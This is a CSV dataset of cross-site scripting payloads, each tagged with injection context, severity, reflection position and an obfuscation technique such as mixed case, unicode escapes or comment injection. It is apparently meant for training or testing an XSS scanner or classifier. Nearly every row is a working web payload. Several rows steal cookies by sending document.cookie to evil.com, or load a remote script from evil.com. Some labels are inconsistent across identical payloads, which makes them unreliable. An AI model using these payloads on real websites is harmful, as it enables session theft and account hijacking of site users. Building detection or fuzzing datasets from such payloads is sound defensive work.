payload,payload_with_context,context,severity,source,sink,reflection_position,technique
</tag><svg onload=alert(1)>,</tag><svg onload=alert(1)> [position:html_body],html_body,medium,,,html_body,none
<DeTaIlS OpEn oNtOgGlE=AlErT(1)>,<DeTaIlS OpEn oNtOgGlE=AlErT(1)> [position:html_body],event_handler,low,,,html_body,obfuscated:mixed_case
"\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)""","\u006coc\u0061tion=""j\u0061v\u0061script:\u0061\u006cert(1)"" [position:none]",dom_sink,medium,,,none,obfuscated:unicode_escape
{{7*7}},{{7*7}} [position:html_body],script_injection,high,,,html_body,obfuscated:unicode_escape
<img/src=x onerror=\u0061\u006cert(1)//>,<img/src=x onerror=\u0061\u006cert(1)//> [position:attribute],event_handler,high,,,attribute,obfuscated:unicode_escape
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:script],script_injection,high,,,script,mutated
javascript:alert(document.domain),javascript:alert(document.domain) [position:attribute],attribute,low,,,attribute,original
${alert(1)},${alert(1)} [position:attribute],template_injection,medium,,,attribute,mutated
""" onerror=\u0061\u006cert(1) x=""",""" onerror=\u0061\u006cert(1) x="" [position:attribute]",attribute,medium,,,attribute,obfuscated:unicode_escape
"eval(""alert(1)"")","eval(""alert(1)"") [position:attribute]",attribute,high,,,attribute,original
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,medium,,,attribute,original
javascript:alert(document.domain),javascript:alert(document.domain) [position:style],js_uri,medium,,,style,original
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,high,,,script,mutated
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:none]",template_injection,medium,,,none,original
"javaSCRIPT:void(document.location=""http://evil.com"")","javaSCRIPT:void(document.location=""http://evil.com"") [position:attribute]",attribute,high,,,attribute,mutated
<svg onload=print()>,<svg onload=print()> [position:comment],attribute,medium,,,comment,mutated
${alert(1)},${alert(1)} [position:style],js_uri,high,,,style,mutated
ONERror='AlERT(1)',ONERror='AlERT(1)' [position:html_body],html_body,medium,,,html_body,mutated
javascript:confirm(1),javascript:confirm(1) [position:none],js_uri,high,,,none,obfuscated:hex_escape
"\x3cembed src=""javascript:alert(1)""\x3e","\x3cembed src=""javascript:alert(1)""\x3e [position:script]",tag_injection,low,,,script,obfuscated:hex_escape
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:script],tag_injection,medium,,,script,original
"\""><img src=x onload=alert(1)>","\""><img src=x onload=alert(1)> [position:script]",script_injection,medium,,,script,mutated
#jAVAScRIPT:ALERT(2);,#jAVAScRIPT:ALERT(2); [position:attribute],url,medium,,,attribute,mutated
<body onload=alert(1)>,<body onload=alert(1)> [position:html_body],script_injection,medium,,,html_body,original
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,high,,,script,original
"\"" onerror=confirm(1)//","\"" onerror=confirm(1)// [position:html_body]",attribute_escape,medium,,,html_body,mutated
"onerror=""alert(1)""","onerror=""alert(1)"" [position:html_body]",html_body,medium,,,html_body,none
"{{constructor.constructor(""confirm(1)"")()}}","{{constructor.constructor(""confirm(1)"")()}} [position:script]",script_injection,medium,,,script,mutated
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:style],template_injection,high,,,style,original
ondblclick='alert(1)',ondblclick='alert(1)' [position:html_body],attribute,medium,,,html_body,mutated
${alert(1)},${alert(1)} [position:html_body],script_injection,high,,,html_body,obfuscated:hex_escape
#{alert(1)},#{alert(1)} [position:attribute],template_injection,high,,,attribute,original
<svg onload=alert()>,<svg onload=alert()> [position:dom],html_body,medium,,,dom,none
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,medium,,,html_body,original
#{alert(1)},#{alert(1)} [position:style],template_injection,high,,,style,original
"\"" onerror
=alert(	1)//","\"" onerror
=alert(	1)// [position:style]",attribute_escape,low,,,style,obfuscated:tab_newline_inject
<img src=x onload=alert(1)>,<img src=x onload=alert(1)> [position:attribute],event_handler,high,,,attribute,mutated
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute,medium,,,attribute,original
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:attribute],attribute_escape,high,,,attribute,original
confirm(1),confirm(1) [position:attribute],attribute,medium,,,attribute,mutated
"data:text/html,<script>alert(1)</script>","data:text/html,<script>alert(1)</script> [position:html_body]",js_uri,high,,,html_body,original
"\""><img src=x onerror=confirm(1)>","\""><img src=x onerror=confirm(1)> [position:script]",attribute_escape,high,,,script,mutated
javascript:confirm(1),javascript:confirm(1) [position:attribute],js_uri,medium,,,attribute,obfuscated:url_encode
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],tag_injection,medium,,,html_body,original
&lt;details open ontoggle=alert(1)&gt;,&lt;details open ontoggle=alert(1)&gt; [position:script],dom_sink,medium,,,script,obfuscated:html_entity
"""><marquee>alert(String.fromCharCode(88,83,83))</script>","""><marquee>alert(String.fromCharCode(88,83,83))</script> [position:html_body]",html_body,high,,,html_body,mutated
${alert(1)},${alert(1)} [position:attribute],attribute_escape,medium,,,attribute,mutated
"\""><img src=x onload=alert(1)>","\""><img src=x onload=alert(1)> [position:style]",attribute_escape,medium,,,style,mutated
"<embed src=""javascript:confirm(1)"">","<embed src=""javascript:confirm(1)""> [position:html_body]",tag_injection,high,,,html_body,mutated
\x3c%= alert(1) %\x3e,\x3c%= alert(1) %\x3e [position:html_body],script_injection,low,,,html_body,obfuscated:hex_escape
${alert(1)},${alert(1)} [position:html_body],template_injection,medium,,,html_body,original
<%= alert(1) %>,<%= alert(1) %> [position:attribute],template_injection,medium,,,attribute,original
<script>alert(document.domain)</script>,<script>alert(document.domain)</script> [position:html_body],script_injection,medium,,,html_body,original
javascript:confirm(1),javascript:confirm(1) [position:none],js_uri,medium,,,none,obfuscated:html_entity
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:attribute],event_handler,medium,,,attribute,obfuscated:comment_inject
' oNmOuSeOvEr=aLeRt(1) ',' oNmOuSeOvEr=aLeRt(1) ' [position:attribute],attribute,medium,,,attribute,obfuscated:mixed_case
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:style]",js_uri,low,,,style,original
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:html_body],attribute_escape,high,,,html_body,original
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:html_body]",tag_injection,low,,,html_body,original
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:script]",tag_injection,medium,,,script,original
#{alert(1)},#{alert(1)} [position:script],template_injection,low,,,script,obfuscated:html_entity
"<script>document.location
=""http://evil.com/?c
=""+document.cookie</script>","<script>document.location
=""http://evil.com/?c
=""+document.cookie</script> [position:script]",script_injection,low,,,script,obfuscated:tab_newline_inject
""" onerror=alert(1) x=""",""" onerror=alert(1) x="" [position:attribute]",attribute,high,,,attribute,original
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:attribute],attribute,medium,,,attribute,mutated
{{7*7}},{{7*7}} [position:none],template_injection,medium,,,none,obfuscated:html_entity
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],tag_injection,high,,,script,original
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute,low,,,attribute,original
<%= confirm(1) %>,<%= confirm(1) %> [position:html_body],event_handler,low,,,html_body,mutated
javascript:confirm(1),javascript:confirm(1) [position:script],js_uri,high,,,script,original
javascr/**/ipt:confirm(1),javascr/**/ipt:confirm(1) [position:none],js_uri,medium,,,none,obfuscated:comment_inject
"\"" onerror=\u0061\u006cert(1)//","\"" onerror=\u0061\u006cert(1)// [position:attribute]",attribute,high,,,attribute,obfuscated:unicode_escape
""" on\u006co\u0061d=\u0061\u006cert(1) x=""",""" on\u006co\u0061d=\u0061\u006cert(1) x="" [position:attribute]",attribute,low,,,attribute,obfuscated:unicode_escape
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:script]",attribute_escape,medium,,,script,mutated
"eval(""alert(1)"")","eval(""alert(1)"") [position:style]",attribute_escape,low,,,style,obfuscated:html_entity
<sVG onload=AlerT()>,<sVG onload=AlerT()> [position:html_body],html_body,medium,,,html_body,mutated
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",js_uri,high,,,script,original
"document.write(""<img src=x onerror=alert(1)>"")","document.write(""<img src=x onerror=alert(1)>"") [position:script]",dom_sink,medium,,,script,original
x=1}}};alert(1)//,x=1}}};alert(1)// [position:attribute],attribute,medium,,,attribute,none
"onload=""alert(1)""","onload=""alert(1)"" [position:html_body]",html_body,medium,,,html_body,none
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,medium,,,attribute,mutated
"document.write(""<img src=x onerror=alert(1)>"")","document.write(""<img src=x onerror=alert(1)>"") [position:html_body]",tag_injection,low,,,html_body,original
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,high,,,attribute,mutated
<img/src=x onerror=alert(1)//>,<img/src=x onerror=alert(1)//> [position:style],event_handler,medium,,,style,original
""" onload
=alert(	1) x
=""",""" onload
=alert(	1) x
="" [position:attribute]",attribute,medium,,,attribute,obfuscated:tab_newline_inject
"//"";window.alert(1))","//"";window.alert(1)) [position:html_body]",html_body,high,,,html_body,mutated
<body on\u006co\u0061d=\u0061\u006cert(1)>,<body on\u006co\u0061d=\u0061\u006cert(1)> [position:style],event_handler,low,,,style,obfuscated:unicode_escape
\x3cimg/src=x onerror=alert(1)//\x3e,\x3cimg/src=x onerror=alert(1)//\x3e [position:attribute],event_handler,high,,,attribute,obfuscated:hex_escape
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:attribute]",event_handler,high,,,attribute,original
"location=""javaSCRIPT:alert(1)""","location=""javaSCRIPT:alert(1)"" [position:script]",dom_sink,medium,,,script,mutated
<script>confirm(1)</script>,<script>confirm(1)</script> [position:html_body],script_injection,medium,,,html_body,original
{{7*7}},{{7*7}} [position:style],template_injection,low,,,style,mutated
javascript:alert(document.domain),javascript:alert(document.domain) [position:attribute],js_uri,medium,,,attribute,original
j\u0061v\u0061script:\u0061\u006cert(1),j\u0061v\u0061script:\u0061\u006cert(1) [position:attribute],js_uri,low,,,attribute,obfuscated:unicode_escape
javascript:alert(1),javascript:alert(1) [position:html_body],js_uri,high,,,html_body,original
"document.body.innerHTML=""<img src=x onerror=alert(1)>""","document.body.innerHTML=""<img src=x onerror=alert(1)>"" [position:attribute]",attribute,medium,,,attribute,original
' ><img src=x onload=alert(1)>,' ><img src=x onload=alert(1)> [position:attribute],attribute,low,,,attribute,mutated
"onloaD=""ALerT(1)""","onloaD=""ALerT(1)"" [position:html_body]",html_body,medium,,,html_body,mutated
javascript:al'+'ert(document.domain),javascript:al'+'ert(document.domain) [position:html_body],js_uri,low,,,html_body,obfuscated:concat_split
"""><img src=x onload=alert(1)>","""><img src=x onload=alert(1)> [position:attribute]",attribute,high,,,attribute,mutated
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:html_body],event_handler,medium,,,html_body,original
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:html_body],event_handler,high,,,html_body,original
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:style],attribute_escape,medium,,,style,mutated
<ScRiPt>pRoMpT(1)</ScRiPt>,<ScRiPt>pRoMpT(1)</ScRiPt> [position:html_body],script_injection,high,,,html_body,obfuscated:mixed_case
<video src=x onerror=confirm(1)>,<video src=x onerror=confirm(1)> [position:none],event_handler,high,,,none,mutated
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:attribute]",js_uri,low,,,attribute,mutated
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,low,,,attribute,obfuscated:html_entity
prompt`1`,prompt`1` [position:comment],attribute,medium,,,comment,mutated
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:none]",template_injection,low,,,none,obfuscated:hex_escape
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,high,,,html_body,original
"eval(""alert(1)"")","eval(""alert(1)"") [position:attribute]",js_uri,high,,,attribute,original
"<img>alert(String.fromCharCode(88,83,83))</script>","<img>alert(String.fromCharCode(88,83,83))</script> [position:html_body]",html_body,high,,,html_body,mutated
<scr/**/ipt>confirm(1)</scr/**/ipt>,<scr/**/ipt>confirm(1)</scr/**/ipt> [position:html_body],script_injection,medium,,,html_body,obfuscated:comment_inject
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,low,,,script,mutated
' onmouseover=alert(1) ',' onmouseover=alert(1) ' [position:attribute],attribute,low,,,attribute,original
<marquee onstart=alert(1)>,<marquee onstart=alert(1)> [position:script],js_uri,medium,,,script,mutated
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:attribute]",js_uri,high,,,attribute,original
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",dom_sink,low,,,script,original
\x3cdetails open ontoggle=alert(1)\x3e,\x3cdetails open ontoggle=alert(1)\x3e [position:html_body],event_handler,low,,,html_body,obfuscated:hex_escape
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,low,,,attribute,original
#{\u0061\u006cert(1)},#{\u0061\u006cert(1)} [position:style],template_injection,medium,,,style,obfuscated:unicode_escape
<det\u0061i\u006cs open ontogg\u006ce=\u0061\u006cert(1)>,<det\u0061i\u006cs open ontogg\u006ce=\u0061\u006cert(1)> [position:script],event_handler,high,,,script,obfuscated:unicode_escape
{{7*7}},{{7*7}} [position:script],script_injection,high,,,script,original
<svg onload=alert`1`>,<svg onload=alert`1`> [position:html_body],html_body,medium,,,html_body,mutated
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:html_body],attribute_escape,medium,,,html_body,original
<iframe/onload=alert(0);>,<iframe/onload=alert(0);> [position:html_body],html_body,medium,,,html_body,none
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:attribute],attribute_escape,high,,,attribute,obfuscated:html_entity
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute,medium,,,attribute,original
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:none]",dom_sink,low,,,none,original
&quot; onerror=alert(1) x=&quot;,&quot; onerror=alert(1) x=&quot; [position:attribute],attribute_escape,high,,,attribute,obfuscated:comment_inject
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",event_handler,low,,,script,mutated
"javascr/**/ipt:void(document.location=""http://evil.com"")","javascr/**/ipt:void(document.location=""http://evil.com"") [position:none]",js_uri,high,,,none,obfuscated:comment_inject
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,high,,,attribute,original
"#""><svg onload=print()>","#""><svg onload=print()> [position:dom]",html_body,medium,,,dom,mutated
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute,high,,,attribute,mutated
<details open ontoggle=alert(1)>,<details open ontoggle=alert(1)> [position:html_body],event_handler,high,,,html_body,original
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:attribute],attribute_escape,medium,,,attribute,original
\' onerror=confirm(1)//,\' onerror=confirm(1)// [position:script],attribute_escape,medium,,,script,mutated
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],dom_sink,high,,,script,original
%3Cimg/src=%3Dx+onload=alert(2)%3D,%3Cimg/src=%3Dx+onload=alert(2)%3D [position:attribute],attribute,medium,,,attribute,url_encoding
"setTimeout(	""alert(	1)"",0)","setTimeout(	""alert(	1)"",0) [position:script]",dom_sink,high,,,script,obfuscated:tab_newline_inject
<input onfocus=\u0061\u006cert(1) \u0061utofocus>,<input onfocus=\u0061\u006cert(1) \u0061utofocus> [position:attribute],event_handler,low,,,attribute,obfuscated:unicode_escape
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],tag_injection,low,,,script,original
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,high,,,attribute,original
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,medium,,,script,original
onload&#61;'alert(1)',onload&#61;'alert(1)' [position:html_body],html_body,medium,,,html_body,mutated
</tag><svg onload=alert(1)>,</tag><svg onload=alert(1)> [position:html_body],html_body,medium,,,html_body,none
<SCRIPT>alert(document.domain)</SCRIPT>,<SCRIPT>alert(document.domain)</SCRIPT> [position:style],event_handler,low,,,style,mutated
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:script]",js_uri,low,,,script,original
<img/src=x onerror=confirm(1)//>,<img/src=x onerror=confirm(1)//> [position:attribute],attribute,medium,,,attribute,mutated
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:none]",template_injection,medium,,,none,obfuscated:url_encode
<script>confirm(document.domain)</script>,<script>confirm(document.domain)</script> [position:html_body],script_injection,low,,,html_body,mutated
"location=""javascript:alert(1)""","location=""javascript:alert(1)"" [position:script]",dom_sink,low,,,script,obfuscated:url_encode
"""><img src
=x onerror
=alert(	1)>","""><img src
=x onerror
=alert(	1)> [position:attribute]",attribute,high,,,attribute,obfuscated:tab_newline_inject
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute,medium,,,attribute,mutated
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:html_body]",template_injection,low,,,html_body,original
<script>confirm(1)</script>,<script>confirm(1)</script> [position:script],script_injection,medium,,,script,obfuscated:unicode_escape
onload='alert(document.domain)',onload='alert(document.domain)' [position:html_body],attribute,medium,,,html_body,mutated
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:style],event_handler,medium,,,style,original
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:html_body],script_injection,medium,,,html_body,original
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,original
"setTimeout(""\u0061\u006cert(1)"",0)","setTimeout(""\u0061\u006cert(1)"",0) [position:attribute]",attribute,medium,,,attribute,obfuscated:unicode_escape
"<embed src=""javascript:alert(1)"">","<embed src=""javascript:alert(1)""> [position:html_body]",tag_injection,high,,,html_body,original
"\""\x3e\x3cimg src=x onerror=alert(1)\x3e","\""\x3e\x3cimg src=x onerror=alert(1)\x3e [position:style]",attribute_escape,low,,,style,obfuscated:hex_escape
<%= al'+'ert(1) %>,<%= al'+'ert(1) %> [position:script],template_injection,low,,,script,obfuscated:concat_split
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:script],tag_injection,low,,,script,mutated
${alert(1)},${alert(1)} [position:attribute],template_injection,low,,,attribute,obfuscated:hex_escape
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:attribute]",template_injection,low,,,attribute,original
"<object data=""javascript:confirm(1)"">","<object data=""javascript:confirm(1)""> [position:script]",tag_injection,low,,,script,mutated
"<script>d.innerHTML+='';</script>//[""'`-->]]>]</div>","<script>d.innerHTML+='';</script>//[""'`-->]]>]</div> [position:html_body]",html_body,high,,,html_body,none
<script>d.innerHTML+='';</script>,<script>d.innerHTML+='';</script> [position:html_body],html_body,high,,,html_body,none
"onerror=""self.alert(1)""","onerror=""self.alert(1)"" [position:html_body]",html_body,medium,,,html_body,mutated
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:script]",tag_injection,low,,,script,original
"<IfRaMe sRc=""JaVaScRiPt:aLeRt(1)"">","<IfRaMe sRc=""JaVaScRiPt:aLeRt(1)""> [position:html_body]",tag_injection,high,,,html_body,obfuscated:mixed_case
<input onfocus=alert(1) autofocus>,<input onfocus=alert(1) autofocus> [position:none],event_handler,high,,,none,mutated
javascript:confirm(document.domain),javascript:confirm(document.domain) [position:attribute],attribute,medium,,,attribute,mutated
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:none]",template_injection,low,,,none,mutated
jAvAsCrIpT:AlErT(DoCuMeNt.dOmAiN),jAvAsCrIpT:AlErT(DoCuMeNt.dOmAiN) [position:html_body],js_uri,low,,,html_body,obfuscated:mixed_case
' onload=alert(1) x=',' onload=alert(1) x=' [position:attribute],attribute,medium,,,attribute,mutated
"<svg/onload
=alert(	1)>","<svg/onload
=alert(	1)> [position:script]",tag_injection,low,,,script,obfuscated:tab_newline_inject
"setTimeout(""alert(1)"",0)","setTimeout(""alert(1)"",0) [position:script]",dom_sink,medium,,,script,original
<img src=x onload=alert(1)>,<img src=x onload=alert(1)> [position:attribute],event_handler,low,,,attribute,mutated
<%= aLeRt(1) %>,<%= aLeRt(1) %> [position:html_body],template_injection,medium,,,html_body,obfuscated:mixed_case
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:html_body]",script_injection,low,,,html_body,original
#{alert(1)},#{alert(1)} [position:style],template_injection,high,,,style,mutated
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:attribute]",attribute_escape,high,,,attribute,mutated
""" onload=alert(1) x=""",""" onload=alert(1) x="" [position:attribute]",attribute,low,,,attribute,original
<details open ontoggle=confirm(1)>,<details open ontoggle=confirm(1)> [position:none],event_handler,medium,,,none,mutated
"\"" onerror=alert(1)//","\"" onerror=alert(1)// [position:attribute]",attribute_escape,medium,,,attribute,original
"ONERRor=""AlerT(1)""","ONERRor=""AlerT(1)"" [position:html_body]",html_body,medium,,,html_body,mutated
${alert(1)},${alert(1)} [position:attribute],template_injection,high,,,attribute,original
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:style]",template_injection,low,,,style,mutated
' onload=alert(1) x=',' onload=alert(1) x=' [position:attribute],attribute,high,,,attribute,mutated
"<iframe src=""javascript:alert(1)"">","<iframe src=""javascript:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,original
"{{constructor.constructor(""alert(1)"")()}}","{{constructor.constructor(""alert(1)"")()}} [position:html_body]",template_injection,high,,,html_body,obfuscated:hex_escape
"onsearch=""alert(1)""","onsearch=""alert(1)"" [position:html_body]",html_body,medium,,,html_body,mutated
<script>alert(1)</script>,<script>alert(1)</script> [position:html_body],script_injection,low,,,html_body,mutated
"\"" onerror=\u0061\u006cert(1)//","\"" onerror=\u0061\u006cert(1)// [position:style]",attribute_escape,medium,,,style,obfuscated:unicode_escape
"\""><img src=x onerror=alert(1)>","\""><img src=x onerror=alert(1)> [position:script]",event_handler,low,,,script,mutated
"eval(	""alert(	1)"")","eval(	""alert(	1)"") [position:html_body]",event_handler,low,,,html_body,obfuscated:tab_newline_inject
<script>alert(	1)</script>,<script>alert(	1)</script> [position:html_body],script_injection,low,,,html_body,obfuscated:tab_newline_inject
&lt;%= alert(1) %&gt;,&lt;%= alert(1) %&gt; [position:script],dom_sink,medium,,,script,obfuscated:html_entity
"#""><svg onload=alert(1)>","#""><svg onload=alert(1)> [position:comment]",attribute,medium,,,comment,none
</tag><svg onload=alert(1)>,</tag><svg onload=alert(1)> [position:html_body],html_body,medium,,,html_body,none
<script>confirm(1)</script>,<script>confirm(1)</script> [position:html_body],script_injection,low,,,html_body,original
.prompt`1`;,.prompt`1`; [position:attribute],attribute,medium,,,attribute,mutated
"<div id=""x"">x</div> <xml:namespace prefix=""t""> <import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;"">","<div id=""x"">x</div> <xml:namespace prefix=""t""> <import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;""> [position:attribute]",url,high,,,attribute,html_entity
<img/src/onerror=alert(1),<img/src/onerror=alert(1) [position:html_body],html_body,medium,,,html_body,none
{{7*7}},{{7*7}} [position:html_body],template_injection,medium,,,html_body,original
{{7*7}},{{7*7}} [position:script],template_injection,low,,,script,obfuscated:html_entity
"document.write(""<img src=x onerror=confirm(1)>"")","document.write(""<img src=x onerror=confirm(1)>"") [position:attribute]",event_handler,medium,,,attribute,mutated
"onload=""alert`1`""","onload=""alert`1`"" [position:html_body]",html_body,medium,,,html_body,mutated
' onload=alert(1) x=',' onload=alert(1) x=' [position:attribute],js_uri,high,,,attribute,mutated
<script>prompt(1)</script>,<script>prompt(1)</script> [position:script],script_injection,high,,,script,original
"""><img src=x onerror=alert(1)>","""><img src=x onerror=alert(1)> [position:attribute]",attribute,high,,,attribute,original
"<embed src=""javaSCRIPT:alert(1)"">","<embed src=""javaSCRIPT:alert(1)""> [position:html_body]",tag_injection,low,,,html_body,mutated
&lt;script src=//evil.com/xss.js&gt;&lt;/script&gt;,&lt;script src=//evil.com/xss.js&gt;&lt;/script&gt; [position:script],script_injection,low,,,script,obfuscated:html_entity
<svg/onload=alert(1)>,<svg/onload=alert(1)> [position:script],tag_injection,medium,,,script,original
<SCRIPT>prompt(1)</SCRIPT>,<SCRIPT>prompt(1)</SCRIPT> [position:html_body],script_injection,medium,,,html_body,mutated
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,low,,,script,original
"eval(""alert(1)"")","eval(""alert(1)"") [position:script]",dom_sink,low,,,script,original
{{7*7}},{{7*7}} [position:attribute],template_injection,high,,,attribute,mutated
"<object data=""javascript:alert(1)"">","<object data=""javascript:alert(1)""> [position:html_body]",tag_injection,high,,,html_body,original
""" onload
=alert(	1) x
=""",""" onload
=alert(	1) x
="" [position:attribute]",attribute,low,,,attribute,obfuscated:tab_newline_inject
<iframe/onload=alert(0);>,<iframe/onload=alert(0);> [position:dom],html_body,medium,,,dom,none
"document.body.innerHTML=""<img src=x onerror=alert(1)>""","document.body.innerHTML=""<img src=x onerror=alert(1)>"" [position:script]",event_handler,medium,,,script,original
<svg onload=alert(1)>,<svg onload=alert(1)> [position:html_body],event_handler,medium,,,html_body,mutated
<img/src=x onerror=confirm(1)//>,<img/src=x onerror=confirm(1)//> [position:attribute],event_handler,medium,,,attribute,mutated
' onerror=alert(1) x=',' onerror=alert(1) x=' [position:attribute],attribute,medium,,,attribute,mutated
<script>confirm(1)</script>,<script>confirm(1)</script> [position:style],event_handler,medium,,,style,original
"<script>document.location=""http://evil.com/?c=""+document.cookie</script>","<script>document.location=""http://evil.com/?c=""+document.cookie</script> [position:script]",script_injection,low,,,script,original
<script src=//evil.com/xss.js></script>,<script src=//evil.com/xss.js></script> [position:script],script_injection,medium,,,script,original
<img/src=x onload=alert(1)//>,<img/src=x onload=alert(1)//> [position:html_body],event_handler,medium,,,html_body,mutated
\' onerror=alert(1)//,\' onerror=alert(1)// [position:attribute],attribute_escape,high,,,attribute,obfuscated:url_encode
<ScRiPt>cOnFiRm(1)</sCrIpT>,<ScRiPt>cOnFiRm(1)</sCrIpT> [position:html_body],script_injection,medium,,,html_body,obfuscated:mixed_case
""" oNfOcUs=aLeRt(1) AuToFoCuS=""",""" oNfOcUs=aLeRt(1) AuToFoCuS="" [position:script]",script_injection,high,,,script,obfuscated:mixed_case
<img src=x onerror=alert(1)>,<img src=x onerror=alert(1)> [position:html_body],tag_injection,high,,,html_body,obfuscated:comment_inject
"javascript:void(document.location=""http://evil.com"")","javascript:void(document.location=""http://evil.com"") [position:html_body]",event_handler,high,,,html_body,mutated
